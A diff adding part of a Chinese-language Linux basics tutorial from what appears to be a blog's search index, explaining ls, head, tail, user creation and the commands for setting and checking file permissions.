+<td>按大小排序显示文件</td>
+</tr>
+<tr>
+<td><code>ls -lt</code></td>
+<td>按修改时间排序</td>
+</tr>
+<tr>
+<td><code>ls -ltr</code></td>
+<td>按时间升序排列（旧文件在前）</td>
+</tr>
+<tr>
+<td><code>ls -R</code></td>
+<td>查看当前目录及所有子目录内容</td>
+</tr>
+</tbody></table>
+<h3 id="12-head命令"><a href="#12-head命令" class="headerlink" title="12.head命令:"></a>12.head命令:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于查看文件或输出的前几行。</span><br><span class="line">head [选项] [文件名]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-n N</code></td>
+<td>显示前 N 行（默认是 10 行）</td>
+<td><code>head -n 5 file.txt</code></td>
+</tr>
+<tr>
+<td><code>-c N</code></td>
+<td>显示前 N 个字节</td>
+<td><code>head -c 20 file.txt</code></td>
+</tr>
+</tbody></table>
+<h4 id="14-tail-命令"><a href="#14-tail-命令" class="headerlink" title="14.tail 命令:"></a>14.tail 命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于查看文件或输出的最后几行。</span><br><span class="line">tail [选项] [文件名]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-n N</code></td>
+<td>显示最后 N 行（默认 10 行）</td>
+<td><code>tail -n 5 error.log</code></td>
+</tr>
+<tr>
+<td><code>-c N</code></td>
+<td>显示最后 N 个字节</td>
+<td><code>tail -c 100 file.txt</code></td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>实时输出追加的内容（日志监控）</td>
+<td><code>tail -f /var/log/syslog</code></td>
+</tr>
+<tr>
+<td><code>+N</code></td>
+<td>从第 N 行开始显示（常用于搭配 <code>tail -n +2</code>）</td>
+<td><code>tail -n +2 file.txt</code></td>
+</tr>
+</tbody></table>
+<h2 id="13-创建一个新用户，并设置密码与权限"><a href="#13-创建一个新用户，并设置密码与权限" class="headerlink" title="13.创建一个新用户，并设置密码与权限"></a>13.创建一个新用户，并设置密码与权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建新用户</span><br><span class="line">        sudo adduser 用户名</span><br><span class="line">设置用户密码（如果没设置成功或要修改）</span><br><span class="line">         sudo passwd 用户名</span><br><span class="line">赋予权限（加入特定组）       </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>权限类型</th>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>更改所有者</td>
+<td><code>chown 用户名 文件/目录</code></td>
+<td>改为该用户拥有文件</td>
+</tr>
+<tr>
+<td>更改权限</td>
+<td><code>chmod</code> 命令</td>
+<td><code>rwx</code> 权限设置（读&#x2F;写&#x2F;执行）</td>
+</tr>
+<tr>
+<td>加入组</td>
+<td><code>usermod -aG 组名 用户</code></td>
+<td>加用户到指定用户组</td>
+</tr>
+<tr>
+<td>设置 ACL</td>
+<td><code>setfacl -m</code></td>
+<td>精细设置用户&#x2F;组的访问权限</td>
+</tr>
+</tbody></table>
+<h3 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限;"></a>查看用户权限;</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>用途</th>
+<th>示例</th>
+<th>输出解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>whoami</code></td>
+<td>查看当前用户名</td>
+<td><code>whoami</code></td>
+<td>如：<code>alice</code></td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>查看 UID、GID、所属组</td>
+<td><code>id</code></td>
+<td><code>uid=1001(alice) gid=1001(alice) groups=1001(alice),100(users)</code></td>
+</tr>
+<tr>
+<td><code>groups</code></td>
+<td>显示所属的所有组</td>
+<td><code>groups</code></td>
+<td>如：<code>alice users</code></td>
+</tr>
+<tr>
+<td><code>echo $PATH</code></td>
+<td>查看命令搜索路径</td>
+<td><code>echo $PATH</code></td>
+<td>可执行命令所在目录</td>
+</tr>
+<tr>
+<td><code>ls -l /路径/文件</code></td>
+<td>查看文件权限</td>
+<td><code>ls -l /etc/passwd</code></td>
+<td><code>-rw-r--r--</code> 表示所有人可读</td>
+</tr>
+<tr>
+<td><code>namei -l /路径/文件</code></td>
+<td>逐级查看路径权限</td>
+<td><code>namei -l /etc/passwd</code></td>
+<td>检查某级目录权限是否阻断</td>
+</tr>
+<tr>
+<td><code>getfacl /路径/文件</code></td>
+<td>查看文件的 ACL 权限（如果启用）</td>
+<td><code>getfacl myfile</code></td>
+<td>显示具体用户的附加权限</td>
+</tr>
+<tr>
+<td><code>test -x 命令路径</code></td>
+<td>判断某程序是否可执行</td>
+<td><code>test -x /usr/bin/python3 &amp;&amp; echo &quot;可执行&quot;</code></td>
+<td>返回 “可执行” 或 “不可执行”</td>
+</tr>
+<tr>
+<td>&#96;cat &#x2F;etc&#x2F;passwd</td>
+<td>grep ^$(whoami)&#96;</td>
+<td>查看当前用户的 shell、主目录等</td>
+<td>&#96;cat &#x2F;etc&#x2F;passwd</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>段位</th>
+<th>字符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>文件类型</td>
+<td><code>-</code></td>
+<td>普通文件（<code>d</code> 是目录，<code>l</code> 是符号链接）</td>
+</tr>
+<tr>
+<td>所属用户权限</td>
+<td><code>rw-</code></td>
+<td><strong>root</strong> 用户：可读、可写</td>
+</tr>
+<tr>
+<td>所属组权限</td>
+<td><code>r--</code></td>
+<td><strong>root</strong> 组：可读（但不可写或执行）</td>
+</tr>
+<tr>
+<td>其他用户权限</td>
+<td><code>r--</code></td>
+<td>所有其他用户：可读（不可写或执行）</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>linxu</category>
+      </categories>
+      <tags>
+        <tag>语言学习</tag>
+        <tag>linxu命令</tag>
       </tags>
   </entry>
   <entry>
